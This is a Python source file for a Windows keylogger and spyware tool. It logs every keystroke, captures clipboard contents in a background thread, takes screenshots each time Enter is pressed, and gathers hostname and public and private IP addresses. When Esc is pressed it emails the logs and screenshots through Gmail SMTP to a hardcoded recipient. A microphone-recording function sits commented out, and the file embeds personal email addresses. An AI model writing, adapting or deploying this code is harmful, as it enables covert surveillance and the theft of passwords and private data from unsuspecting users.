# Libraries
import threading

from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

import smtplib

import socket
import platform

import win32clipboard

from pynput.keyboard import Key, Listener
import os
import atexit
from requests import get

from PIL import ImageGrab


class ClipboardThread(threading.Thread):
    def __init__(self):
        super(ClipboardThread, self).__init__()
        self._stop_event = threading.Event()

    def run(self):
        # file_path = os.path.dirname(os.path.abspath(__file__))
        # extend = "\\"
        # clipboard_information = "clipboard.txt"
        previous_data = None
        while True:
            with open(file_path + extend + clipboard_information, "a") as f:
                try:
                    win32clipboard.OpenClipboard()
                    pasted_data = win32clipboard.GetClipboardData()
                    win32clipboard.CloseClipboard()
                    if previous_data != pasted_data:
                        previous_data = pasted_data
                        print("New data is added")
                        f.write("Clipboard Data \n" + pasted_data + "\n")
                except:
                    continue

    def stop(self):
        self._stop_event.set()

keys_information = "key_log.txt"
system_information = "system.txt"
clipboard_information = "clipboard.txt"
screenshot_name = "screenshot"
screenshot_extension = ".png"
email_address = "igolop777@gmail.com"
## some password
toaddr="igor.lopatkin@icloud.com"
file_path = os.path.dirname(os.path.abspath(__file__))

# key_information_e = "e_key_log.txt"
# system_information_e = "e_system_information"
# clipboard_information_e = "e_clipboard.txt"




microphone_time = 10
audio_information = "audio.wav"
email_address = "igolop777@gmail.com"





password = "some password"






extend = "\\"
file_merge = file_path + extend


fullPathToKeyloggFile = file_merge+keys_information

fullPathToComputerInfo = file_merge+system_information

fullPathToClipboardInfo = file_merge+clipboard_information

keylogg = open(fullPathToKeyloggFile, 'w+')
computer_info = open(fullPathToComputerInfo, 'w+')
clipboard = open(fullPathToClipboardInfo, 'w+')

global screenshotsHashMap
screenshotsHashMap = {}

keylogHashMap = {keys_information: fullPathToKeyloggFile, system_information: fullPathToComputerInfo, clipboard_information: fullPathToClipboardInfo }


def computer_information():
    with open(file_path+extend+system_information, "a") as f:
        print("Computer info is captured")
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address: " + public_ip)

        except Exception:
            f.write("Couldn't get Publi IP Address (most likely max query)")

        f.write("Processor: " + (platform.processor()) + '\n')
        f.write("System: " + platform.system() + " " + platform.version() + '\n')
        f.write("Machine: " + platform.machine() + "\n")
        f.write("Hostname " + hostname + "\n")
        f.write("Private IP Address: " + IPAddr + "\n")


computer_information()


thread = ClipboardThread()
thread.start()


def send_email(keylogHashMap, toaddr):
    msg = MIMEMultipart()
    print("Second attachment")

    fromaddr = email_address

    msg['From'] = fromaddr

    msg['To'] = toaddr

    msg['Subject'] = "Log File"

    body = "Body_of_the_mail"

    msg.attach(MIMEText(body, 'plain'))
    global screenshotsHashMap
    print("Length of the screenshot map: " + str(len(screenshotsHashMap)))
    for key, value in screenshotsHashMap.items():
        file = open(value, 'rb')
        payload = MIMEBase('application', 'octet-stream')
        payload.set_payload(file.read())
        encoders.encode_base64(payload)
        payload.add_header('Content-Disposition', 'attachment; filename= %s' % key)
        msg.attach(payload)

    for key, value in keylogHashMap.items():
        file = open(value, 'rb')
        payload = MIMEBase('application', 'octet-stream')
        payload.set_payload(file.read())
        encoders.encode_base64(payload)
        payload.add_header('Content-Disposition', 'attachment; filename= %s' % key)
        msg.attach(payload)

    s = smtplib.SMTP('smtp.gmail.com', 587)

    s.starttls()

    s.login(fromaddr, password)

    text = msg.as_string()

    s.sendmail(fromaddr, toaddr, text)

    s.quit()


# def microphone():
#     fs = 44100
#     seconds = microphone_time
#
#     myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
#     sd.wait()
#     print("Audio records")
#     write(file_path + extend + audio_information, fs, myrecording)
#
#
# th2 = threading.Thread(target=microphone)
# th2.start()


def screenshot(currentScreenshotCounter):
    im = ImageGrab.grab()
    im.save(file_path + extend + screenshot_name + str(currentScreenshotCounter) + screenshot_extension)
    screenshotsHashMap[screenshot_name + str(currentScreenshotCounter) + screenshot_extension] = file_path + extend + screenshot_name + str(currentScreenshotCounter) + screenshot_extension
    print("Screen shot has been made" + str(currentScreenshotCounter))

count = 0
keys = []


def on_press(key):

    global keys, count

    keys.append(key)
    count += 1

    if count >= 1:
        count = 0
        write_file(keys)
        keys = []


global currentScreenshotCounter
currentScreenshotCounter = 0


def write_file(keys):
    with open(file_path + extend + keys_information, "a") as f:
        for key in keys:
            print("Key: " + str(key))
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                f.write('\n')
                f.close()
            elif k.find("Key") == -1:
                f.write(k)
                f.close()


def on_release(key):
    global currentScreenshotCounter
    if key == Key.enter:
        screenshot(currentScreenshotCounter)
        currentScreenshotCounter += 1

    elif key == Key.esc:
        print("Sending keys")
        thread.stop()
        send_email(keylogHashMap, toaddr)

        return False


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()


def exit_handler():
    # send_email(keylogHashMap, toaddr)
    print('My application is ending!')


atexit.register(exit_handler)

